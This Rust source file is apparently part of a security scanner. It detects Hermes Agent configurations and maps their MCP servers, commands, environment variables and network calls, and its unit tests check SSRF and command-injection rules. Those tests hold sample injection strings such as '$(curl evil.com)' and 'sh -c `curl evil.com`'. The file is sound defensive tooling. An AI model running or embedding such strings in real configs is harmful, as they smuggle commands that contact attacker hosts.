//! Hermes Agent adapter.
//!
//! Detects Hermes Agent client configuration and skill trees, then loads:
//! - `config.yaml` / `.hermes/config.yaml` / profile configs with `mcp_servers`
//! - `.hermes.md` project context
//! - `skills/`, `optional-skills/`, and `optional-mcps/` artifacts

pub(crate) mod config;
pub(crate) mod discovery;

use std::path::{Path, PathBuf};

use crate::analysis::cross_file::apply_cross_file_sanitization;
use crate::config::ScanPathFilter;
use crate::error::Result;
use crate::ir::execution_surface::ExecutionSurface;
use crate::ir::taint_builder::build_data_surface;
use crate::ir::tool_surface::ToolSurface;
use crate::ir::*;
use crate::parser;

use config::{
    has_hermes_skill_tree, has_optional_mcp_catalog, has_profile_config, looks_like_hermes_config,
    parse_mcp_servers_from_yaml,
};
use discovery::{collect_hermes_source_files, is_yaml_file};

/// Hermes Agent client adapter.
///
/// Detection intentionally requires Hermes-specific artifacts. Generic context
/// files such as `AGENTS.md` and `CLAUDE.md` are not enough to avoid treating
/// ordinary coding-agent projects as Hermes projects.
pub struct HermesAgentAdapter;

impl super::Adapter for HermesAgentAdapter {
    fn framework(&self) -> Framework {
        Framework::HermesAgent
    }

    fn detect(&self, root: &Path) -> bool {
        let has_other_hermes_artifact = root.join(".hermes.md").exists()
            || has_profile_config(root)
            || has_hermes_skill_tree(root)
            || has_optional_mcp_catalog(root);

        // `.hermes/config.yaml` is a Hermes-specific path, so `model:` alone
        // is trusted there. A bare top-level `config.yaml` is generic enough
        // (ML/CI configs use `model:` too) that `model:` only counts when
        // paired with another Hermes artifact already found above.
        has_other_hermes_artifact
            || looks_like_hermes_config(&root.join("config.yaml"), has_other_hermes_artifact)
            || looks_like_hermes_config(&root.join(".hermes").join("config.yaml"), true)
    }

    fn load(&self, root: &Path, ignore_tests: bool) -> Result<Vec<ScanTarget>> {
        let filter = ScanPathFilter::for_ignore_tests(ignore_tests);
        self.load_with_filter(root, &filter)
    }

    fn load_with_filter(&self, root: &Path, filter: &ScanPathFilter) -> Result<Vec<ScanTarget>> {
        let name = root
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "hermes-agent".into());

        let mut tools: Vec<ToolSurface> = Vec::new();
        let mut execution = ExecutionSurface::default();
        let mut source_files: Vec<SourceFile> = Vec::new();

        collect_hermes_source_files(root, filter, &mut source_files)?;

        for sf in &source_files {
            if is_yaml_file(&sf.path) {
                parse_mcp_servers_from_yaml(&sf.content, &sf.path, &mut tools, &mut execution);
            }
        }

        let mut parsed_files: Vec<(PathBuf, parser::ParsedFile)> = Vec::new();
        for sf in &source_files {
            if let Some(parser) = parser::parser_for_language(sf.language) {
                if let Ok(parsed) = parser.parse_file(&sf.path, &sf.content) {
                    parsed_files.push((sf.path.clone(), parsed));
                }
            }
        }

        apply_cross_file_sanitization(&mut parsed_files);

        for (_, parsed) in parsed_files {
            execution.commands.extend(parsed.commands);
            execution.file_operations.extend(parsed.file_operations);
            execution
                .network_operations
                .extend(parsed.network_operations);
            execution.env_accesses.extend(parsed.env_accesses);
            execution.dynamic_exec.extend(parsed.dynamic_exec);
        }

        let dependencies = super::mcp::parse_dependencies(root, filter);
        let provenance = super::mcp::parse_provenance(root, filter);
        let data = build_data_surface(&tools, &execution);

        Ok(vec![ScanTarget {
            name,
            framework: Framework::HermesAgent,
            root_path: root.to_path_buf(),
            tools,
            execution,
            data,
            dependencies,
            provenance,
            source_files,
        }])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::adapter::Adapter;
    use config::classify_config_value;

    fn fixture_dir() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/hermes_agent")
    }

    #[test]
    fn test_detect_hermes_agent() {
        let adapter = HermesAgentAdapter;
        assert!(adapter.detect(&fixture_dir()));
    }

    #[test]
    fn test_detect_non_hermes_project() {
        let adapter = HermesAgentAdapter;
        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/mcp_servers/safe_calculator");
        assert!(!adapter.detect(&dir));
    }

    #[test]
    fn test_bare_model_key_alone_does_not_detect_hermes() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join("config.yaml"), "model: gpt-4\n").unwrap();

        let adapter = HermesAgentAdapter;
        assert!(
            !adapter.detect(temp.path()),
            "a generic config.yaml with only `model:` should not be detected as Hermes"
        );
    }

    #[test]
    fn test_model_key_under_hermes_dir_detects_hermes() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(temp.path().join(".hermes")).unwrap();
        std::fs::write(
            temp.path().join(".hermes").join("config.yaml"),
            "model: gpt-4\n",
        )
        .unwrap();

        let adapter = HermesAgentAdapter;
        assert!(
            adapter.detect(temp.path()),
            ".hermes/config.yaml with `model:` should be detected as Hermes"
        );
    }

    #[test]
    fn test_mcp_servers_key_detects_hermes() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(
            temp.path().join("config.yaml"),
            "mcp_servers:\n  svc:\n    command: npx\n",
        )
        .unwrap();

        let adapter = HermesAgentAdapter;
        assert!(
            adapter.detect(temp.path()),
            "a config.yaml with `mcp_servers:` should be detected as Hermes"
        );
    }

    #[test]
    fn test_load_hermes_framework() {
        let adapter = HermesAgentAdapter;
        let targets = adapter.load(&fixture_dir(), false).unwrap();
        assert_eq!(targets.len(), 1);
        assert_eq!(targets[0].framework, Framework::HermesAgent);
    }

    #[test]
    fn test_load_hermes_mcp_servers() {
        let adapter = HermesAgentAdapter;
        let targets = adapter.load(&fixture_dir(), false).unwrap();
        let target = &targets[0];

        let tool_names: Vec<&str> = target.tools.iter().map(|tool| tool.name.as_str()).collect();
        assert!(tool_names.contains(&"filesystem"));
        assert!(tool_names.contains(&"company_api"));
        assert!(!tool_names.contains(&"legacy"));

        assert!(
            target
                .execution
                .commands
                .iter()
                .any(|command| command.function == "npx")
        );
        assert!(target
            .execution
            .network_operations
            .iter()
            .any(|network| matches!(&network.url_arg, ArgumentSource::Literal(url) if url == "https://mcp.internal.example.com")));
    }

    #[test]
    fn test_load_hermes_sensitive_env_and_headers() {
        let adapter = HermesAgentAdapter;
        let targets = adapter.load(&fixture_dir(), false).unwrap();
        let target = &targets[0];

        assert!(target.execution.env_accesses.iter().any(|env| {
            env.is_sensitive
                && matches!(&env.var_name, ArgumentSource::Literal(name) if name == "GITHUB_PERSONAL_ACCESS_TOKEN")
        }));
        assert!(target.execution.env_accesses.iter().any(|env| {
            env.is_sensitive
                && matches!(&env.var_name, ArgumentSource::Literal(name) if name == "header:Authorization")
        }));
    }

    #[test]
    fn test_classify_config_value_plain_literal() {
        assert_eq!(
            classify_config_value("https://api.example.com"),
            ArgumentSource::Literal("https://api.example.com".into())
        );
        assert_eq!(
            classify_config_value("npx -y @modelcontextprotocol/server-filesystem"),
            ArgumentSource::Literal("npx -y @modelcontextprotocol/server-filesystem".into())
        );
    }

    #[test]
    fn test_classify_config_value_detects_interpolation() {
        for value in [
            "${MCP_URL}",
            "$MCP_URL",
            "$(curl evil.com)",
            "{{base_url}}/api",
            "sh -c `curl evil.com`",
        ] {
            assert_eq!(
                classify_config_value(value),
                ArgumentSource::Interpolated,
                "{value} should be classified as Interpolated"
            );
        }
    }

    #[test]
    fn test_parse_quoted_server_name_and_bracket_args() {
        let content =
            "mcp_servers:\n  \"custom_tool\":\n    command: grep\n    args: [\"-e\", \"[0-9]\"]\n";
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join("config.yaml"), content).unwrap();

        let adapter = HermesAgentAdapter;
        let targets = adapter.load(temp.path(), false).unwrap();
        let target = &targets[0];
        assert_eq!(target.tools[0].name, "custom_tool");
        assert_eq!(target.execution.commands[0].function, "grep");
        assert!(matches!(
            &target.execution.commands[0].command_arg,
            ArgumentSource::Literal(cmd) if cmd == "grep -e [0-9]"
        ));
    }

    fn run_rule_on_hermes_config(rule_id: &str, content: &str) -> Vec<crate::rules::Finding> {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join("config.yaml"), content).unwrap();

        let adapter = HermesAgentAdapter;
        let targets = adapter.load(temp.path(), false).unwrap();
        crate::rules::builtin::all_detectors()
            .into_iter()
            .find(|d| d.metadata().id == rule_id)
            .unwrap_or_else(|| panic!("no detector registered for {rule_id}"))
            .run(&targets[0])
    }

    #[test]
    fn test_literal_url_does_not_trigger_ssrf() {
        let content = "mcp_servers:\n  svc:\n    url: https://api.example.com\n";
        let findings = run_rule_on_hermes_config("SHIELD-003", content);
        assert!(
            findings.is_empty(),
            "a plain literal URL should not trigger SHIELD-003, got {findings:?}"
        );
    }

    #[test]
    fn test_interpolated_url_triggers_ssrf() {
        let content = "mcp_servers:\n  svc:\n    url: \"{{base_url}}/api\"\n";
        let findings = run_rule_on_hermes_config("SHIELD-003", content);
        assert!(
            !findings.is_empty(),
            "an interpolated URL should trigger SHIELD-003"
        );
    }

    #[test]
    fn test_interpolated_command_arg_triggers_command_injection() {
        let content =
            "mcp_servers:\n  svc:\n    command: sh\n    args: [\"-c\", \"${USER_CMD}\"]\n";
        let findings = run_rule_on_hermes_config("SHIELD-001", content);
        assert!(
            !findings.is_empty(),
            "an interpolated command arg should trigger SHIELD-001"
        );
    }
}
